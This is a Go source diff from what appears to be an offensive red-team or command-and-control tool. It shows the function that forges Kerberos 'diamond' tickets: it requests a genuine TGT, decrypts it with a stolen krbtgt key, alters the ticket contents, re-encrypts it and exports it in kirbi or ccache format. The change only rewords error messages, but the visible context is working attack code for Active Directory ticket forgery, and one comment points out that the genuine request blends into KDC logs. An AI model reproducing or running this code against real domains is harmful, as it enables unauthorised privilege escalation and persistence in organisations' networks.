@@ -41,7 +41,7 @@ func ticketDiamond(args ticketArgs) structs.CommandResult {
 
 	// Validate required args
 	if args.Realm == "" || args.Username == "" || args.Key == "" || args.KrbtgtKey == "" || args.Server == "" {
-		return errorResult("Error: realm, username, key (user key), krbtgt_key, and server (KDC) are required for diamond")
+		return errorResult("realm, username, key (user key), krbtgt_key, and server (KDC) are required for diamond")
 	}
 
 	realm := strings.ToUpper(args.Realm)
@@ -66,7 +66,7 @@ func ticketDiamond(args ticketArgs) structs.CommandResult {
 	// Parse user key (for AS exchange authentication)
 	userKeyBytes, err := hex.DecodeString(args.Key)
 	if err != nil {
-		return errorf("Error decoding user key hex: %v", err)
+		return errorf("decoding user key hex: %v", err)
 	}
 	defer structs.ZeroBytes(userKeyBytes)
 
@@ -83,7 +83,7 @@ func ticketDiamond(args ticketArgs) structs.CommandResult {
 	// Parse krbtgt key (for ticket decryption/re-encryption)
 	krbtgtKeyBytes, err := hex.DecodeString(args.KrbtgtKey)
 	if err != nil {
-		return errorf("Error decoding krbtgt key hex: %v", err)
+		return errorf("decoding krbtgt key hex: %v", err)
 	}
 	defer structs.ZeroBytes(krbtgtKeyBytes)
 
@@ -106,19 +106,19 @@ func ticketDiamond(args ticketArgs) structs.CommandResult {
 	// Step 1: Get legitimate TGT via AS exchange (creates real KDC log entry)
 	tgt, sessionKey, err := ticketOPtH(args.Username, realm, etypeID, etypeCfgName, userKey, kdcAddr)
 	if err != nil {
-		return errorf("Error obtaining TGT for %s: %v", args.Username, err)
+		return errorf("obtaining TGT for %s: %v", args.Username, err)
 	}
 
 	// Step 2: Decrypt the ticket's EncPart using krbtgt key
 	plainBytes, err := crypto.DecryptEncPart(tgt.EncPart, krbtgtKey, keyusage.KDC_REP_TICKET)
 	if err != nil {
-		return errorf("Error decrypting ticket with krbtgt key (wrong key?): %v", err)
+		return errorf("decrypting ticket with krbtgt key (wrong key?): %v", err)
 	}
 
 	// Step 3: Parse EncTicketPart
 	var etp messages.EncTicketPart
 	if err := etp.Unmarshal(plainBytes); err != nil {
-		return errorf("Error parsing EncTicketPart: %v", err)
+		return errorf("parsing EncTicketPart: %v", err)
 	}
 
 	// Step 4: Modify the EncTicketPart
@@ -135,7 +135,7 @@ func ticketDiamond(args ticketArgs) structs.CommandResult {
 	// Step 5: Re-marshal and re-encrypt with krbtgt key
 	etpBytes, err := asn1.Marshal(etp)
 	if err != nil {
-		return errorf("Error marshaling modified EncTicketPart: %v", err)
+		return errorf("marshaling modified EncTicketPart: %v", err)
 	}
 	etpBytes = asn1tools.AddASNAppTag(etpBytes, asnAppTag.EncTicketPart)
 
@@ -146,7 +146,7 @@ func ticketDiamond(args ticketArgs) structs.CommandResult {
 
 	encData, err := crypto.GetEncryptedData(etpBytes, krbtgtKey, keyusage.KDC_REP_TICKET, kvno)
 	if err != nil {
-		return errorf("Error re-encrypting ticket: %v", err)
+		return errorf("re-encrypting ticket: %v", err)
 	}
 
 	// Build modified ticket preserving outer structure
@@ -169,18 +169,18 @@ func ticketDiamond(args ticketArgs) structs.CommandResult {
 	case "kirbi":
 		kirbiBytes, err := ticketToKirbi(modifiedTicket, sessionKey, targetUser, realm, sname, ticketFlags, authTime, endTime, renewTill)
 		if err != nil {
-			return errorf("Error creating kirbi: %v", err)
+			return errorf("creating kirbi: %v", err)
 		}
 		output = ticketDiamondFormatOutput(args, realm, targetUser, targetRID, sessionKey, authTime, endTime, base64.StdEncoding.EncodeToString(kirbiBytes))
 	case "ccache":
 		ticketBytes, err := modifiedTicket.Marshal()
 		if err != nil {
-			return errorf("Error marshaling ticket: %v", err)
+			return errorf("marshaling ticket: %v", err)
 		}
 		ccacheBytes := ticketToCCache(ticketBytes, sessionKey, targetUser, realm, sname, ticketFlags, authTime, endTime, renewTill)
 		output = ticketDiamondFormatOutput(args, realm, targetUser, targetRID, sessionKey, authTime, endTime, base64.StdEncoding.EncodeToString(ccacheBytes))
 	default:
-		return errorf("Error: unknown format %q. Use: kirbi, ccache", args.Format)
+		return errorf("unknown format %q. Use: kirbi, ccache", args.Format)
 	}
 
 	return successResult(output)
